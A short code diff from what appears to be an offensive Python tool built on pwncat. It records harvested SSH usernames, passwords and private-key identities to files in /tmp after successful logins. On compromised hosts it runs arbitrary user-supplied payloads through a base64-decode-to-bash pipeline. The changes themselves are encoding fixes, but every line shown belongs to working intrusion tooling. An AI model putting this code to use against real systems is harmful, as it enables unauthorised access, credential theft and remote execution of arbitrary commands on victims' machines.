@@ -60,7 +60,7 @@ def execute(session: pwncat.manager.Session, task):
     session.log("starting module")
     try:
         if task == "custom":
-            payload = base64.b64encode(str(args.payload).encode("utf-8"))
+            payload = base64.b64encode(f'{args.payload}'.encode("utf-8"))
             result = session.platform.run(
                 f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
                 cwd="/tmp", timeout=7200)
@@ -191,17 +191,18 @@ def attempt_ssh_connection(user, credential, credential_type, target_ip, target_
 
             # Correct file writing with encoding
             with open('/tmp/found-users.txt', 'ab+') as f:
-                f.write(user.encode() + b'\n')  # Ensure bytes are written
+                # Ensure bytes are written
+                f.write(f'{user}\n'.encode("utf-8"))
             if credential_type == 'password':
                 with open('/tmp/found-passwords.txt', 'ab+') as f:
-                    f.write(credential.encode() + b'\n')
+                    f.write(f'{credential}\n'.encode("utf-8"))
                 with open('/tmp/found-user-passwords.txt', 'ab+') as f:
-                    f.write(user.encode() + ":" + credential.encode() + b'\n')
+                    f.write(f'{user}:{credential}\n'.encode("utf-8"))
             elif credential_type == 'identity':
                 with open('/tmp/found-identities.txt', 'ab+') as f:
-                    f.write(credential.encode() + b'\n')
+                    f.write(f'{credential}\n'.encode("utf-8"))
                 with open('/tmp/found-user-identities.txt', 'ab+') as f:
-                    f.write(user.encode() + ":" + credential.encode() + b'\n')
+                    f.write(f'{user}:{credential}\n'.encode("utf-8"))
 
             execute(session, task)  # Execute the specified task
             # Return True if connection and task execution were successful
